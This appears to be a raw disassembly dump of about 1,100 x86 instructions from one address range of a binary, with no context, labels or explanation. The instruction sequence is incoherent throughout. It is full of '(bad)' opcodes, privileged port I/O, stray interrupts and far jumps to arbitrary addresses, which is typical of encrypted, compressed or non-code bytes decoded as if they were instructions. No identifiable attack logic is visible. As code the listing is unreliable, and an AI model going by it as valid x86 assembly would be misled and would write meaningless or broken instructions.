  40babe:	or     esi,DWORD PTR [esi-0x5c6d4251]
  40bac4:	adc    eax,0x501929fe
  40bac9:	inc    esp
  40baca:	pop    eax
  40bacb:	fsubr  st(5),st
  40bacd:	jle    0x40bb26
  40bacf:	lods   al,BYTE PTR ds:[esi]
  40bad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bad1:	inc    edi
  40bad2:	inc    esi
  40bad3:	dec    ebp
  40bad4:	mov    esp,DWORD PTR ds:0xd2f0fe28
  40bada:	push   ecx
  40badb:	mov    BYTE PTR [esi-0x4c9e7392],al
  40bae1:	xchg   DWORD PTR [ebx+edi*8-0x69db12a2],esi
  40bae8:	jo     0x40bb12
  40baea:	jle    0x40bae7
  40baec:	dec    esp
  40baed:	jne    0x40bb5e
  40baef:	lds    eax,FWORD PTR [edx+0x32]
  40baf2:	(bad)  
  40baf3:	pusha  
  40baf4:	mov    ds:0x97ae08b9,al
  40baf9:	das    
  40bafa:	enter  0x90ea,0xe5
  40bafe:	mul    DWORD PTR [edi]
  40bb00:	jp     0x40bb25
  40bb02:	xchg   esi,eax
  40bb03:	dec    edx
  40bb04:	loopne 0x40bb08
  40bb06:	or     edi,0xffffffc3
  40bb09:	mov    bh,0x9d
  40bb0b:	xchg   ecx,eax
  40bb0c:	mov    dl,BYTE PTR [edi+eax*4-0x46]
  40bb10:	pop    es
  40bb11:	loop   0x40bac1
  40bb13:	ss xchg esp,eax
  40bb15:	xchg   esi,eax
  40bb16:	and    edi,esp
  40bb18:	ror    DWORD PTR [ecx],1
  40bb1a:	fild   QWORD PTR [ebx+0x2f0db876]
  40bb20:	mov    WORD PTR [eax],fs
  40bb22:	int    0x26
  40bb24:	and    ebx,DWORD PTR [ebx-0x4b71908e]
  40bb2a:	and    eax,0x8bdde1dd
  40bb2f:	xor    ebp,DWORD PTR [ebx-0x2f]
  40bb32:	call   0x6e248d81
  40bb37:	outs   dx,DWORD PTR ds:[esi]
  40bb38:	and    DWORD PTR [ebp+0x7b],edx
  40bb3b:	inc    ecx
  40bb3c:	cmp    edi,DWORD PTR cs:[edi+edi*2+0x5c]
  40bb41:	int    0xa4
  40bb43:	scas   al,BYTE PTR es:[edi]
  40bb44:	adc    DWORD PTR [edi+edi*4],ecx
  40bb47:	ret    
  40bb48:	sub    eax,0x3a1016ff
  40bb4d:	fdiv   QWORD PTR [edx+0x6164f77a]
  40bb53:	int3   
  40bb54:	fistp  WORD PTR [edi+0x3e661820]
  40bb5a:	or     eax,0x37421cf8
  40bb5f:	dec    ecx
  40bb60:	pop    esp
  40bb61:	pmaxub mm3,QWORD PTR ds:[ebx]
  40bb65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb66:	aas    
  40bb67:	mov    ch,BYTE PTR [edx-0x445e6bfa]
  40bb6d:	xchg   ecx,eax
  40bb6e:	or     BYTE PTR [edx],dh
  40bb70:	retf   0x8540
  40bb73:	repnz mov bh,0x4b
  40bb76:	inc    ebp
  40bb77:	xchg   edx,eax
  40bb78:	mov    dl,0xef
  40bb7a:	xchg   edi,eax
  40bb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb7c:	pop    edx
  40bb7d:	out    dx,eax
  40bb7e:	int    0x5
  40bb80:	fisttp WORD PTR [ebx+0x6b]
  40bb83:	jl     0x40bb4a
  40bb85:	stos   BYTE PTR es:[edi],al
  40bb86:	adc    edi,DWORD PTR [eax+0x7a7e72e3]
  40bb8c:	dec    ebp
  40bb8d:	lea    esp,[ebx]
  40bb8f:	retf   0xbcef
  40bb92:	jns    0x40bb32
  40bb94:	adc    eax,0xd2dd6533
  40bb99:	pop    edi
  40bb9a:	stos   DWORD PTR es:[edi],eax
  40bb9b:	popf   
  40bb9c:	xchg   DWORD PTR [ecx-0x1d],ecx
  40bb9f:	ret    0xb02
  40bba2:	and    al,0xfc
  40bba4:	(bad)  
  40bba5:	ja     0x40bb8d
  40bba7:	add    BYTE PTR [edi],bl
  40bba9:	popa   
  40bbaa:	mov    BYTE PTR [edx-0x77b117f3],ch
  40bbb0:	jbe    0x40bbd9
  40bbb2:	fimul  DWORD PTR [edi-0x2ea8c3e8]
  40bbb8:	jne    0x40bb4b
  40bbba:	mov    ds,WORD PTR [eax+eax*4]
  40bbbd:	cli    
  40bbbe:	xlat   BYTE PTR ds:[ebx]
  40bbbf:	scas   eax,DWORD PTR es:[edi]
  40bbc0:	inc    ebx
  40bbc1:	push   ecx
  40bbc2:	retf   
  40bbc3:	rcl    BYTE PTR [eax],0xe8
  40bbc6:	pop    edx
  40bbc7:	xor    ch,BYTE PTR [ebp+edi*4-0x2e]
  40bbcb:	sbb    eax,0x9f161530
  40bbd0:	div    BYTE PTR [ebp+0x62]
  40bbd3:	clc    
  40bbd4:	push   edx
  40bbd5:	adc    eax,0x567e492d
  40bbda:	ja     0x40bbf1
  40bbdc:	and    eax,0xcb7df417
  40bbe1:	pop    ebp
  40bbe2:	xchg   ebp,eax
  40bbe3:	pop    edx
  40bbe4:	adc    al,0x3e
  40bbe6:	(bad)  
  40bbe7:	out    dx,eax
  40bbe8:	mov    al,ch
  40bbea:	push   eax
  40bbeb:	add    DWORD PTR [edx+0x1d519978],ebx
  40bbf1:	sub    BYTE PTR [edi-0x3272942b],bl
  40bbf7:	aaa    
  40bbf8:	sbb    al,0xed
  40bbfa:	dec    esp
  40bbfb:	iret   
  40bbfc:	sub    al,0x8d
  40bbfe:	ficomp WORD PTR [edx+0x75]
  40bc01:	and    eax,DWORD PTR [ecx]
  40bc03:	enter  0xeb77,0x39
  40bc07:	pop    ss
  40bc08:	adc    ebp,ebp
  40bc0a:	cmp    ebx,DWORD PTR [edx]
  40bc0c:	ficom  WORD PTR [ebp-0x1f598378]
  40bc12:	(bad)  
  40bc13:	lock sbb bh,bl
  40bc16:	xchg   ch,bl
  40bc18:	cwde   
  40bc19:	inc    esi
  40bc1a:	call   0xb2d0:0xa28b9c6f
  40bc21:	retf   0x87f5
  40bc24:	jnp    0x40bbc2
  40bc26:	mov    ecx,0xcb5a118c
  40bc2b:	sub    eax,0x3e2a5244
  40bc30:	adc    ebx,DWORD PTR [eax+esi*1+0x30]
  40bc34:	in     al,dx
  40bc35:	add    eax,0xe6a82037
  40bc3a:	mov    bl,0x97
  40bc3c:	push   ebx
  40bc3d:	sar    DWORD PTR [esi-0x1d143240],0xfc
  40bc44:	aam    0xe6
  40bc46:	adc    dh,BYTE PTR [eax+ebx*4+0x38]
  40bc4a:	out    dx,al
  40bc4b:	mov    bh,BYTE PTR [ecx+edx*1]
  40bc4e:	lea    ebx,[eax-0x6a786fce]
  40bc54:	jns    0x40bc97
  40bc56:	mov    bl,0xdc
  40bc58:	and    dh,BYTE PTR [ebp-0x3c609a8b]
  40bc5e:	mov    BYTE PTR [eax+0x31],0xbd
  40bc62:	cmc    
  40bc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc64:	cmp    al,bh
  40bc66:	inc    edi
  40bc67:	daa    
  40bc68:	and    al,0x86
  40bc6a:	scas   eax,DWORD PTR es:[edi]
  40bc6b:	sbb    al,0x3c
  40bc6d:	and    dl,BYTE PTR [eax+0x3d]
  40bc70:	popa   
  40bc71:	pop    eax
  40bc72:	sub    al,BYTE PTR [ebx]
  40bc74:	inc    esp
  40bc75:	jmp    0x40bc3f
  40bc77:	mov    al,BYTE PTR [ebx+edx*2+0x2d]
  40bc7b:	sti    
  40bc7c:	arpl   WORD PTR [esp+ecx*8-0x1d],bp
  40bc80:	mov    bl,ah
  40bc82:	lock pushf 
  40bc84:	sub    bh,BYTE PTR [ecx]
  40bc86:	mov    ebx,0xb45eb163
  40bc8b:	pop    eax
  40bc8c:	test   al,0x4d
  40bc8e:	xchg   esp,eax
  40bc8f:	ds push 0x7e58da30
  40bc95:	out    dx,eax
  40bc96:	xchg   ecx,edi
  40bc98:	sahf   
  40bc99:	push   0xffffffeb
  40bc9b:	out    dx,eax
  40bc9c:	jmp    0xdd75:0x3add403d
  40bca3:	les    esp,FWORD PTR [ecx]
  40bca5:	out    dx,eax
  40bca6:	sbb    al,0xf8
  40bca8:	inc    ecx
  40bca9:	out    0x99,al
  40bcab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcac:	pop    ecx
  40bcad:	test   al,0xb9
  40bcaf:	and    bl,BYTE PTR [ecx+edi*8-0x6d1cc6ae]
  40bcb6:	xor    al,0x35
  40bcb8:	adc    eax,0xc5a66056
  40bcbd:	out    0x81,al
  40bcbf:	(bad)  
  40bcc0:	pop    ds
  40bcc1:	adc    eax,0xb73dd6ce
  40bcc6:	sti    
  40bcc7:	sub    BYTE PTR [ebp+0x29],al
  40bcca:	mov    al,ds:0xb2e4600e
  40bccf:	fild   DWORD PTR [ebx-0x62]
  40bcd2:	pop    ss
  40bcd3:	mov    eax,ds:0xb0cf47ea
  40bcd8:	mov    ebp,0x7152a45a
  40bcdd:	mov    eax,0xf68865af
  40bce2:	imul   eax,DWORD PTR [ebx],0xfffffff6
  40bce5:	ss mov ebp,0xd577cfd9
  40bceb:	mov    edx,0xcce1dc67
  40bcf0:	sar    BYTE PTR [edi+eiz*1],cl
  40bcf3:	icebp  
  40bcf4:	xor    ah,ch
  40bcf6:	mov    WORD PTR [ecx+0x466a8fdc],gs
  40bcfc:	fmul   DWORD PTR ss:[edx]
  40bcff:	sub    dl,BYTE PTR [edx]
  40bd01:	cmp    edx,DWORD PTR [ecx-0xed898b9]
  40bd07:	jns    0x40bd5f
  40bd09:	ins    BYTE PTR es:[edi],dx
  40bd0a:	xor    esi,ebp
  40bd0c:	cmp    BYTE PTR ds:0x99618b0e,0xf8
  40bd13:	out    dx,al
  40bd14:	in     al,dx
  40bd15:	jge    0x40bd57
  40bd17:	imul   edi,DWORD PTR [edi+0x67cb474f],0xffffffb6
  40bd1e:	jno    0x40bcff
  40bd20:	jae    0x40bd50
  40bd22:	mov    ebp,0xaa01244
  40bd27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd28:	fwait
  40bd29:	add    eax,0x1632aceb
  40bd2e:	sti    
  40bd2f:	sub    al,0xe0
  40bd31:	adc    eax,0xbccef669
  40bd36:	xor    eax,0xb95b28ea
  40bd3b:	cmp    BYTE PTR [edi],dl
  40bd3d:	adc    al,0x6a
  40bd3f:	and    BYTE PTR [esi-0x37],bl
  40bd42:	rcl    BYTE PTR [ebx],0x25
  40bd45:	shr    DWORD PTR [edi-0x24],0x7e
  40bd49:	mov    dh,BYTE PTR [ecx+0x54139388]
  40bd4f:	mov    esi,0x937e55bf
  40bd54:	jnp    0x40bd26
  40bd56:	mov    DWORD PTR [esi+0x17ee363c],edx
  40bd5c:	js     0x40bda5
  40bd5e:	pop    ecx
  40bd5f:	imul   ebp,DWORD PTR [edi+eax*2+0x45c7680d],0xf841f437
  40bd6a:	stos   DWORD PTR es:[edi],eax
  40bd6b:	jl     0x40bd5c
  40bd6d:	ins    DWORD PTR es:[edi],dx
  40bd6e:	cmc    
  40bd6f:	xchg   ebx,eax
  40bd70:	pop    ecx
  40bd71:	test   eax,0xcec0e13b
  40bd76:	sbb    BYTE PTR [edi+0x64e8f3d7],bh
  40bd7c:	mov    ecx,0x2d7b0e7e
  40bd81:	adc    ecx,DWORD PTR [ecx]
  40bd83:	push   ds
  40bd84:	dec    edi
  40bd85:	rcl    BYTE PTR [eax-0x4c],cl
  40bd88:	mov    ebx,0xdd7cce79
  40bd8d:	push   esp
  40bd8e:	jne    0x40bd46
  40bd90:	push   eax
  40bd91:	mul    al
  40bd93:	push   ebp
  40bd94:	sbb    BYTE PTR [ebp+eiz*1-0x455ec647],al
  40bd9b:	adc    DWORD PTR [eax-0x1a],ebp
  40bd9e:	sahf   
  40bd9f:	cmp    dh,BYTE PTR [ebp+0xc616904]
  40bda5:	push   edi
  40bda6:	pop    esi
  40bda7:	(bad)  [di-0x38]
  40bdab:	outs   dx,BYTE PTR ds:[esi]
  40bdac:	test   BYTE PTR [esi-0x20c5b08b],0x99
  40bdb3:	inc    esp
  40bdb4:	jne    0x40be13
  40bdb6:	cmp    BYTE PTR [edx+0x3bd76da9],dh
  40bdbc:	and    BYTE PTR [ebx+0x14],bl
  40bdbf:	sub    ecx,eax
  40bdc1:	fsub   st(0),st
  40bdc3:	adc    BYTE PTR [edx+0x57],0xf3
  40bdc7:	xchg   edi,eax
  40bdc8:	push   cs
  40bdc9:	inc    ebx
  40bdca:	fwait
  40bdcb:	add    bh,bh
  40bdcd:	inc    esi
  40bdce:	push   eax
  40bdcf:	(bad)  
  40bdd0:	jmp    0x40bdc6
  40bdd2:	and    eax,0x9cfb5774
  40bdd7:	adc    al,0x8c
  40bdd9:	add    al,0xe3
  40bddb:	add    bl,bl
  40bddd:	mov    ds:0x3e74f9c0,eax
  40bde2:	les    ebx,FWORD PTR [ecx-0x54]
  40bde5:	jae    0x40bdc6
  40bde7:	out    0x20,eax
  40bde9:	retf   
  40bdea:	cmp    al,0x77
  40bdec:	aad    0x7
  40bdee:	addr16 sbb eax,ebx
  40bdf1:	mov    DWORD PTR [edi],ebp
  40bdf3:	xchg   BYTE PTR [edx+ecx*2+0x38],al
  40bdf7:	ret    0x7166
  40bdfa:	pop    edx
  40bdfb:	cmp    dl,BYTE PTR ds:0x490589de
  40be01:	and    al,0xb3
  40be03:	push   esi
  40be04:	jp     0x40be4c
  40be06:	loopne 0x40be65
  40be08:	and    BYTE PTR [eax+0x79],al
  40be0b:	xor    DWORD PTR [edi],ebp
  40be0d:	inc    ebp
  40be0e:	and    eax,0xef5299
  40be13:	mov    eax,ds:0x70d48dc6
  40be18:	xchg   ebp,eax
  40be19:	sub    esi,DWORD PTR [ebp-0xbb5edd8]
  40be1f:	scas   eax,DWORD PTR es:[edi]
  40be20:	(bad)  
  40be21:	bound  edx,QWORD PTR [edx+edi*4-0x7bb87025]
  40be28:	sbb    al,0xab
  40be2a:	dec    ebp
  40be2b:	pop    eax
  40be2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be2d:	and    al,0x7
  40be2f:	and    DWORD PTR [edi-0x5a49fd99],0xffffffce
  40be36:	into   
  40be37:	inc    edx
  40be38:	xor    al,dl
  40be3a:	xchg   BYTE PTR [eax+0x4ac02ff0],bl
  40be40:	stos   BYTE PTR es:[edi],al
  40be41:	xor    eax,0x22a1f85a
  40be46:	aad    0x3d
  40be48:	inc    ebx
  40be49:	pop    ebx
  40be4a:	jns    0x40be51
  40be4c:	imul   ebx,DWORD PTR [eax-0x2f20a9fc],0xffffff86
  40be53:	lds    ebp,FWORD PTR ds:0x3802a131
  40be59:	add    edx,esi
  40be5b:	scas   al,BYTE PTR es:[edi]
  40be5c:	sbb    eax,0x2c26e7ba
  40be61:	cmp    eax,0xc02cf854
  40be66:	mov    ds:0xa99e6a21,eax
  40be6b:	pop    edi
  40be6c:	mov    ch,0xe9
  40be6e:	sub    bh,BYTE PTR [ebp+0x40]
  40be71:	pushf  
  40be72:	cwde   
  40be73:	imul   esi,DWORD PTR [edx+0x10],0xffffffb2
  40be77:	test   eax,0xec093a48
  40be7c:	mov    ds:0x66fda1c8,eax
  40be81:	dec    ebp
  40be82:	sbb    eax,0x6e28a9f2
  40be87:	cwde   
  40be88:	inc    ebp
  40be89:	outs   dx,DWORD PTR ds:[esi]
  40be8a:	lock sub esi,DWORD PTR [ebx+0x56613ff7]
  40be91:	adc    edx,ebx
  40be93:	aam    0xb8
  40be95:	or     ebx,esp
  40be97:	mov    ebx,0xc9ebe59
  40be9c:	mov    gs,WORD PTR [ebp+0x20]
  40be9f:	retf   0x7349
  40bea2:	sub    esp,DWORD PTR [ecx+0x7857d88e]
  40bea8:	fstp   DWORD PTR [esi-0x75c913d9]
  40beae:	(bad)  
  40beaf:	push   eax
  40beb0:	jne    0x40bf0a
  40beb2:	loop   0x40be3e
  40beb4:	or     edx,ebx
  40beb6:	je     0x40becd
  40beb8:	fsub   st(1),st
  40beba:	retf   
  40bebb:	arpl   WORD PTR [ebx],bp
  40bebd:	clc    
  40bebe:	push   ebx
  40bebf:	iret   
  40bec0:	frstor [ecx-0x6be14806]
  40bec6:	pop    ebp
  40bec7:	(bad)  
  40bec8:	loope  0x40bef4
  40beca:	fbld   TBYTE PTR [ebp+0x155daac6]
  40bed0:	out    dx,al
  40bed1:	je     0x40bed6
  40bed3:	mov    ecx,0x8b246d30
  40bed8:	dec    edi
  40bed9:	adc    al,0x55
  40bedb:	pop    esi
  40bedc:	xlat   BYTE PTR ds:[ebx]
  40bedd:	aad    0x6c
  40bedf:	mov    dl,dl
  40bee1:	hlt    
  40bee2:	adc    al,0xf2
  40bee4:	loope  0x40be90
  40bee6:	sbb    eax,0x3a551619
  40beeb:	cs adc ecx,ebp
  40beee:	cmp    edi,DWORD PTR [esi+0x5d]
  40bef1:	xchg   ebp,eax
  40bef2:	adc    ebx,esp
  40bef4:	xor    al,0x4d
  40bef6:	and    ah,BYTE PTR [ebp+0x3962f85]
  40befc:	imul   edx,edx,0x528e820
  40bf02:	das    
  40bf03:	cdq    
  40bf04:	push   ds
  40bf05:	cmc    
  40bf06:	bnd jge 0x40bf6a
  40bf09:	mov    dl,0x36
  40bf0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf0c:	jge    0x40beda
  40bf0e:	std    
  40bf0f:	jle    0x40bf24
  40bf11:	push   eax
  40bf12:	and    al,0x14
  40bf14:	dec    ebx
  40bf15:	xor    DWORD PTR [eax-0x274f9c12],edi
  40bf1b:	xchg   ebp,eax
  40bf1c:	cmp    BYTE PTR [edi-0x2bf4bc84],dl
  40bf22:	jecxz  0x40becf
  40bf24:	or     al,BYTE PTR [eax+edi*1]
  40bf27:	pop    es
  40bf28:	or     cl,BYTE PTR [ecx-0x1e933ce2]
  40bf2e:	jp     0x40bf56
  40bf30:	out    0x86,al
  40bf32:	jecxz  0x40bf7b
  40bf34:	xchg   ebx,eax
  40bf35:	imul   ecx,DWORD PTR [eax+0x73964312],0xffffffd8
  40bf3c:	ins    DWORD PTR es:[edi],dx
  40bf3d:	cld    
  40bf3e:	stos   DWORD PTR es:[edi],eax
  40bf3f:	(bad)  
  40bf41:	cdq    
  40bf42:	lds    ebx,FWORD PTR [ebp+0x26c853f9]
  40bf48:	outs   dx,BYTE PTR ds:[esi]
  40bf49:	adc    eax,0x5f8ad77b
  40bf4e:	stos   DWORD PTR es:[edi],eax
  40bf4f:	cmp    eax,ebx
  40bf51:	pop    ds
  40bf52:	idiv   BYTE PTR [ebx+ebp*1-0x791101e2]
  40bf59:	ins    BYTE PTR es:[edi],dx
  40bf5a:	xor    cl,bh
  40bf5c:	es out 0x21,eax
  40bf5f:	scas   al,BYTE PTR es:[edi]
  40bf60:	sbb    BYTE PTR [ebp+0x7b7dbb09],bh
  40bf66:	or     dl,BYTE PTR [edx-0x19aa9041]
  40bf6c:	and    cl,dh
  40bf6e:	pop    edi
  40bf6f:	test   al,0x66
  40bf71:	mov    ch,0x70
  40bf73:	std    
  40bf74:	and    eax,ebx
  40bf76:	ror    DWORD PTR [edx+0x3e7cc868],1
  40bf7c:	dec    ebp
  40bf7d:	outs   dx,DWORD PTR ds:[esi]
  40bf7e:	or     esi,edi
  40bf80:	jbe    0x40bf47
  40bf82:	push   esi
  40bf83:	fld    DWORD PTR [edx-0x73]
  40bf86:	add    edi,DWORD PTR [eax+0x5c]
  40bf89:	ss (bad) 
  40bf8b:	(bad)  
  40bf8c:	mov    BYTE PTR [ebp-0x53],cl
  40bf8f:	(bad)  
  40bf90:	int    0x8d
  40bf92:	xor    eax,0xe4c2a5cf
  40bf97:	mov    cl,0xdb
  40bf99:	xlat   BYTE PTR ds:[ebx]
  40bf9a:	(bad)  
  40bf9b:	fcom   DWORD PTR ds:0x18e28c83
  40bfa1:	jns    0x40c00e
  40bfa3:	repnz cmp al,0x2b
  40bfa6:	mov    al,ds:0xcdecac1e
  40bfab:	add    bl,BYTE PTR [edi-0x2a092476]
  40bfb1:	loopne 0x40c024
  40bfb3:	retfw  
  40bfb5:	cmp    al,0x4c
  40bfb7:	leave  
  40bfb8:	xchg   DWORD PTR ds:0xea36a5c2,ebx
  40bfbe:	add    ah,al
  40bfc0:	xlat   BYTE PTR ds:[ebx]
  40bfc1:	inc    eax
  40bfc2:	add    DWORD PTR [ecx+0x26],esp
  40bfc5:	xor    DWORD PTR [esi-0x58],esi
  40bfc8:	sbb    BYTE PTR ds:0x3175a989,ch
  40bfce:	sbb    DWORD PTR [ebx+ecx*8+0x124d9afe],esi
  40bfd5:	mov    ecx,DWORD PTR [ebx-0x44d2954]
  40bfdb:	scas   eax,DWORD PTR es:[edi]
  40bfdc:	jge    0x40c02f
  40bfde:	mov    al,ds:0x94266b9b
  40bfe3:	sbb    ah,BYTE PTR [ebx]
  40bfe5:	mov    esi,0xf290a133
  40bfea:	add    edi,edi
  40bfec:	leave  
  40bfed:	adc    eax,0x86a36381
  40bff2:	stos   BYTE PTR es:[edi],al
  40bff3:	push   ecx
  40bff4:	dec    eax
  40bff5:	mov    bh,0xaf
  40bff7:	or     edx,DWORD PTR [esi]
  40bff9:	jmp    0x40bfd9
  40bffb:	mov    dh,0x44
  40bffd:	sub    al,0xc8
  40bfff:	sbb    al,0x4e
  40c001:	and    DWORD PTR [esi-0x6f14d366],ecx
  40c007:	xchg   ecx,eax
  40c008:	ins    BYTE PTR es:[edi],dx
  40c009:	add    al,0x5b
  40c00b:	push   eax
  40c00c:	jge    0x40c031
  40c00e:	cmp    DWORD PTR [edx+0x58c4bd89],esi
  40c014:	push   ebp
  40c015:	sub    BYTE PTR [esi-0x2c],dl
  40c018:	loope  0x40c020
  40c01a:	push   0xc6e955a5
  40c01f:	repnz and DWORD PTR [ecx+0x2d],0xb0df59d
  40c027:	jl     0x40c00e
  40c029:	(bad)  
  40c02a:	lds    eax,FWORD PTR [eax+0x1]
  40c02d:	or     BYTE PTR [eax-0x30],cl
  40c030:	imul   DWORD PTR [ebp+0x17570a4a]
  40c036:	shl    DWORD PTR ss:[ebx-0x32],1
  40c03a:	fild   QWORD PTR [edx-0x47]
  40c03d:	jmp    0xc6285215
  40c042:	push   esi
  40c043:	not    DWORD PTR ds:0x9c70339
  40c049:	mov    bl,0x39
  40c04b:	dec    esi
  40c04c:	retf   
  40c04d:	dec    esp
  40c04e:	in     eax,0x24
  40c050:	fcom   QWORD PTR [ebp-0x6a]
  40c053:	jmp    0xd6f5f2de
  40c058:	inc    edi
  40c059:	jecxz  0x40c029
  40c05b:	mov    ebp,edi
  40c05d:	cmc    
  40c05e:	retf   
  40c05f:	jae    0x40c03c
  40c061:	mov    BYTE PTR [esi],0x3
  40c064:	aaa    
  40c065:	cmp    al,0x4b
  40c067:	(bad)  
  40c068:	push   ds
  40c069:	push   0xa
  40c06b:	stos   DWORD PTR es:[edi],eax
  40c06c:	cli    
  40c06d:	xchg   esi,eax
  40c06e:	enter  0xeb4a,0xdb
  40c072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c073:	fnstsw ax
  40c075:	mov    al,0xb9
  40c077:	mov    cl,0x86
  40c079:	int    0x62
  40c07b:	sub    BYTE PTR [ecx],ch
  40c07d:	dec    edx
  40c07e:	mov    ecx,ebp
  40c080:	iret   
  40c081:	adc    ah,BYTE PTR [ebx+ebp*4]
  40c084:	dec    ebp
  40c085:	fstsw  WORD PTR [ecx-0x3819e729]
  40c08c:	push   esp
  40c08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08e:	lods   eax,DWORD PTR ds:[esi]
  40c08f:	cmp    DWORD PTR [edi],edx
  40c091:	(bad)  
  40c093:	xor    eax,0xfd67ef5f
  40c098:	rcr    DWORD PTR [ebx-0x303cc509],1
  40c09e:	cmp    bh,BYTE PTR [ecx]
  40c0a0:	cwde   
  40c0a1:	cmp    eax,esp
  40c0a3:	bnd ret 0xfb64
  40c0a7:	in     al,0xe7
  40c0a9:	das    
  40c0aa:	push   esp
  40c0ab:	adc    eax,0xf1c8af1b
  40c0b0:	mov    edx,0x9733c9bf
  40c0b5:	out    dx,al
  40c0b6:	or     bl,bl
  40c0b8:	cmp    al,0x7e
  40c0ba:	push   edx
  40c0bb:	and    eax,0xda6183d7
  40c0c0:	cmp    bh,ch
  40c0c2:	push   edx
  40c0c3:	cmp    al,0xf4
  40c0c5:	js     0x40c144
  40c0c7:	scas   eax,DWORD PTR es:[edi]
  40c0c8:	mov    bl,0xd9
  40c0ca:	push   esi
  40c0cb:	fstp   DWORD PTR [esi-0x7f75637]
  40c0d1:	jg     0x40c13a
  40c0d3:	jp     0x40c0b6
  40c0d5:	(bad)  
  40c0d6:	ret    0x82a6
  40c0d9:	mov    ecx,0xc9125391
  40c0de:	xchg   esi,eax
  40c0df:	lods   al,BYTE PTR ds:[esi]
  40c0e0:	js     0x40c08e
  40c0e2:	add    eax,0x72c0e3c5
  40c0e7:	or     BYTE PTR [ebp-0x230d030],bl
  40c0ed:	mov    eax,0x775fda39
  40c0f2:	or     ah,BYTE PTR [eax]
  40c0f4:	data16 int 0xd5
  40c0f7:	arpl   WORD PTR [ecx-0x7f],bp
  40c0fa:	xlat   BYTE PTR ds:[ebx]
  40c0fb:	cli    
  40c0fc:	test   eax,0x179771f4
  40c101:	lea    esp,[edx]
  40c103:	xor    eax,0x264d6b5a
  40c108:	inc    ebx
  40c109:	sbb    BYTE PTR [edx-0x7a],ch
  40c10c:	xor    al,0xcd
  40c10e:	jbe    0x40c0ff
  40c110:	push   ds
  40c111:	sub    al,0xbc
  40c113:	cdq    
  40c114:	mov    al,BYTE PTR [ebp-0x4391f98e]
  40c11a:	sbb    DWORD PTR [edx],0x24
  40c11d:	outs   dx,DWORD PTR ds:[esi]
  40c11e:	jno    0x40c150
  40c120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c121:	sbb    eax,0x711c22e7
  40c126:	push   edi
  40c127:	jmp    0x40c10d
  40c129:	fxtract 
  40c12b:	test   bl,0x21
  40c12e:	dec    edx
  40c12f:	stos   DWORD PTR es:[edi],eax
  40c130:	inc    esp
  40c131:	mov    al,0x55
  40c133:	sub    eax,0x501b0b47
  40c138:	pop    ss
  40c139:	jecxz  0x40c187
  40c13b:	xor    al,0x55
  40c13d:	push   esp
  40c13e:	mov    esi,0xafe743e3
  40c143:	sbb    DWORD PTR [edi-0x69ce6dc9],esi
  40c149:	jnp    0x40c17e
  40c14b:	mov    ds:0x42892fa0,al
  40c150:	jnp    0x40c151
  40c152:	pop    esi
  40c153:	xor    dl,ch
  40c155:	cmp    al,0x4d
  40c157:	repz sub DWORD PTR es:[esi],0x76
  40c15c:	mov    ch,0x2d
  40c15e:	pop    esi
  40c15f:	out    0xf,eax
  40c161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c162:	int    0xa8
  40c164:	xchg   edx,eax
  40c165:	sbb    ebp,ebx
  40c167:	mov    eax,0x7585119f
  40c16c:	mov    ds:0x6cfcdcb6,al
  40c171:	xchg   esp,eax
  40c172:	push   ds
  40c173:	loopne 0x40c1c1
  40c175:	push   es
  40c176:	dec    eax
  40c177:	stc    
  40c178:	jnp    0x40c13d
  40c17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c17b:	jo     0x40c121
  40c17d:	bound  esi,QWORD PTR [eax+0x4e]
  40c180:	les    eax,FWORD PTR [eax-0x39]
  40c183:	imul   esp,DWORD PTR ds:0x3ccf0560,0x2563df24
  40c18d:	icebp  
  40c18e:	les    ebx,FWORD PTR [edx+0x19]
  40c191:	mov    edx,DWORD PTR [ebp+0x1855e634]
  40c197:	addr16 dec ebx
  40c199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19a:	jo     0x40c120
  40c19c:	jo     0x40c17c
  40c19e:	js     0x40c1ce
  40c1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a1:	or     eax,0x4b048a45
  40c1a6:	stos   BYTE PTR es:[edi],al
  40c1a7:	jmp    0x40c179
  40c1a9:	imul   eax,DWORD PTR [eax-0x32],0xf4117647
  40c1b0:	dec    esp
  40c1b1:	jp     0x40c198
  40c1b3:	push   ds
  40c1b4:	aas    
  40c1b5:	pop    ds
  40c1b6:	inc    esi
  40c1b7:	shr    BYTE PTR [eax+esi*4-0x48],0x7
  40c1bc:	retf   0x9c05
  40c1bf:	jbe    0x40c17f
  40c1c1:	arpl   bp,dx
  40c1c3:	push   esi
  40c1c4:	dec    ebx
  40c1c5:	clc    
  40c1c6:	out    dx,eax
  40c1c7:	mov    ecx,0x1ab7151
  40c1cc:	bound  esi,QWORD PTR [edi]
  40c1ce:	xor    dh,ah
  40c1d0:	ds call 0x8136:0xf9474c6d
  40c1d8:	mov    BYTE PTR es:[edx+0x6d],dl
  40c1dc:	test   BYTE PTR [esi],ch
  40c1de:	pop    eax
  40c1df:	bswap  ebx
  40c1e1:	xlat   BYTE PTR ds:[ebx]
  40c1e2:	(bad)  
  40c1e3:	jb     0x40c184
  40c1e5:	icebp  
  40c1e6:	ins    BYTE PTR es:[edi],dx
  40c1e7:	push   ss
  40c1e8:	sbb    eax,0xcfdd2b36
  40c1ed:	adc    DWORD PTR [ebx],ebx
  40c1ef:	sub    DWORD PTR [edx-0x34ff530c],edi
  40c1f5:	push   edx
  40c1f6:	stc    
  40c1f7:	iret   
  40c1f8:	fs pop edx
  40c1fa:	fldenv [esi]
  40c1fc:	push   ebx
  40c1fd:	mov    al,ds:0x68cdfe21
  40c202:	dec    DWORD PTR [eax]
  40c204:	adc    eax,0xe7bc1157
  40c209:	or     eax,0xe54c7596
  40c20e:	neg    BYTE PTR [edx-0x411259d1]
